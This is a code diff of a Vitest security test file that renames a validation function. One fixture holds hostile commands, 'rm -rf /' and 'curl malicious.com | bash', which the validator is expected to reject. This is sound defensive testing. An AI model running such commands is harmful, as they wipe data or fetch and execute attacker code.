@@ -1,6 +1,6 @@
 import { describe, it, expect, vi } from "vitest"
 import {
-  validateTestDefinition,
+  validateDefinition,
   validateTestExecutor,
   validateSuite,
   sanitizeCommands,
@@ -239,7 +239,7 @@ describe("Security Integration Tests", () => {
         commands: ['echo "safe"', "rm -rf /", "curl malicious.com | bash"],
       }
 
-      const result = validateTestDefinition(maliciousDefinition)
+      const result = validateDefinition(maliciousDefinition)
       expect(result.isValid).toBe(false)
       expect(result.errors).toHaveProperty("name")
       expect(result.errors).toHaveProperty("image")
@@ -254,7 +254,7 @@ describe("Security Integration Tests", () => {
         commands: ["npm", "test", "--", "--integration"],
       }
 
-      const result = validateTestDefinition(safeDefinition)
+      const result = validateDefinition(safeDefinition)
       expect(result.isValid).toBe(true)
       expect(result.errors).toEqual({})
     })
